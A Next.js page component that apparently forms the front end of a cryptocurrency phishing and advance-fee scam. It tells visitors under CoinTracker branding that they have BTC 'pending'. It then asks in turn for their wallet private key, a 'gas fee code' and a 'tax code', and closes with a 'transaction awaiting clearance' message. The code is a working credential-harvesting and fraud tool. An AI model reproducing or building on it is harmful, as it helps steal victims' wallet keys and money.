"use client";

import Navbar from "../components/Navbar";
import { useEffect, useLayoutEffect, useState } from "react";
import { Button, Form, Input } from "antd";
import { useSearchParams } from "next/navigation";
import { useAppContext } from "../context/AppContext";
import Loader from "../components/Loader";

export default function Home() {
  const searchParams = useSearchParams();
  const txn_id = searchParams.get("txn_id");
  const {
    getTransaction,
    ValidatePrivateKey,
    ValidateGasFee,
    ValidateTaxFee,
    privateKeyValidateIsLoading,
    runPrivateKeyLoader,
    transactionData,
  } = useAppContext();
  const [validationStep, setValidationStep] = useState(0);

  const getTransactionById = async (id) => {
    const res = await getTransaction(id);
  };

  const onFinish = async (values) => {
    const res = await ValidatePrivateKey(values.private_key);
  };
  const onGasFinish = async (values) => {
    const res = await ValidateGasFee(values.private_key);
  };
  const onTaxFinish = async (values) => {
    const res = await ValidateTaxFee(values.private_key);
  };
  useLayoutEffect(() => {
    getTransactionById(txn_id);
  }, []);

  console.log(transactionData);
  useEffect(() => {
    const step = localStorage.getItem("validationStep");
    if (step) {
      runPrivateKeyLoader(true);
    }
  }, []);

  return (
    <div className="h-full w-full flex flex-col">
      <Navbar />
      {transactionData?.step === 1 && (
        <>
          {privateKeyValidateIsLoading ? (
            <Loader />
          ) : (
            <Form
              name="login"
              className={
                "container px-4 mx-auto mt-12 flex-auto flex flex-col items-center gap-6 w-full sm:max-w-[400px]"
              }
              onFinish={onFinish}
              // onFinishFailed={onFinishFailed}
              autoComplete="off"
            >
              <h1 className="text-[1.5rem] font-[600]">
                You Have {transactionData?.coin_type ?? 0.0}
                {transactionData?.coin_type ?? "BTC"} Pending
              </h1>
              <div className="flex flex-col items-center w-full">
                <Form.Item
                  name="private_key"
                  className="w-full"
                  rules={[
                    {
                      required: true,
                      message: "",
                    },
                  ]}
                >
                  <Input
                    placeholder="Enter PRIVATE KEY Code to Proceed"
                    className="w-full"
                  />
                </Form.Item>
                <p className="mt-[0.1rem] text-grey text-[0.8rem] text-light">
                  you have to get your private key to proceed!
                </p>
              </div>

              <Form.Item className="w-full">
                <Button
                  // loading={isLoading}
                  type="primary"
                  htmlType="submit"
                  className="w-full pro py-4 bg-blue text-white !text-[0.8rem]"
                >
                  Click Here to Proceed
                </Button>
              </Form.Item>
            </Form>
          )}
        </>
      )}
      {transactionData?.step === 2 && (
        <>
          {privateKeyValidateIsLoading ? (
            <Loader />
          ) : (
            <Form
              name="login"
              className={
                "container px-4 mx-auto mt-12 flex-auto flex flex-col items-center gap-6 w-full sm:max-w-[400px]"
              }
              onFinish={onGasFinish}
              // onFinishFailed={onFinishFailed}
              autoComplete="off"
            >
              <h1 className="text-[1.5rem] font-[600]">
                You Have {transactionData?.coin_type ?? 0.0}
                {transactionData?.coin_type ?? "BTC"} Pending
              </h1>
              <div className="flex flex-col items-center w-full">
                <Form.Item
                  name="private_key"
                  className="w-full"
                  rules={[
                    {
                      required: true,
                      message: "",
                    },
                  ]}
                >
                  <Input
                    placeholder="Enter GAS Fee Code to Proceed"
                    className="w-full"
                  />
                </Form.Item>
                <p className="mt-[0.1rem] text-grey text-[0.8rem] text-light">
                  you have to get your gas fee code to proceed!
                </p>
              </div>

              <Form.Item className="w-full">
                <Button
                  // loading={isLoading}
                  type="primary"
                  htmlType="submit"
                  className="w-full pro py-4 bg-blue text-white !text-[0.8rem]"
                >
                  Click Here to Proceed
                </Button>
              </Form.Item>
            </Form>
          )}
        </>
      )}
      {transactionData?.step === 3 && (
        <>
          {privateKeyValidateIsLoading ? (
            <Loader />
          ) : (
            <Form
              name="login"
              className={
                "container px-4 mx-auto mt-12 flex-auto flex flex-col items-center gap-6 w-full sm:max-w-[400px]"
              }
              onFinish={onTaxFinish}
              // onFinishFailed={onFinishFailed}
              autoComplete="off"
            >
              <h1 className="text-[1.5rem] font-[600]">
                You Have {transactionData?.coin_type ?? 0.0}
                {transactionData?.coin_type ?? "BTC"} Pending
              </h1>
              <div className="flex flex-col items-center w-full">
                <Form.Item
                  name="private_key"
                  className="w-full"
                  rules={[
                    {
                      required: true,
                      message: "",
                    },
                  ]}
                >
                  <Input
                    placeholder="Enter Tax Code to Proceed"
                    className="w-full"
                  />
                </Form.Item>
                <p className="mt-[0.1rem] text-grey text-[0.8rem] text-light">
                  you have to get your Tax code to proceed!
                </p>
              </div>

              <Form.Item className="w-full">
                <Button
                  // loading={isLoading}
                  type="primary"
                  htmlType="submit"
                  className="w-full pro py-4 bg-blue text-white !text-[0.8rem]"
                >
                  Click Here to Proceed
                </Button>
              </Form.Item>
            </Form>
          )}
        </>
      )}
      {transactionData?.step > 3 && (
        <div
          className={
            "container px-4 mx-auto mt-12 flex-auto flex flex-col justify-center items-center gap-2 w-full sm:max-w-[400px]"
          }
        >
          <h1 className="text-[1.5rem] font-[600] text-center">
            Transaction awaiting clearance...
          </h1>
          <p className="mt-2 text-grey text-[0.8rem] text-light">
            you will receive a mail shortly!
          </p>
        </div>
      )}
      {!transactionData?.step && <div className="flex-auto"></div>}

      <div className="flex flex-row justify-center my-10 text-center">
        <p className="text-[0.8rem]">
          When you create a CoinTracker account, you<br></br>agree to the{" "}
          <span className="underline cursor-pointer">Terms</span> and{" "}
          <span className="underline cursor-pointer">Privacy Policy</span>.
        </p>
      </div>
    </div>
  );
}
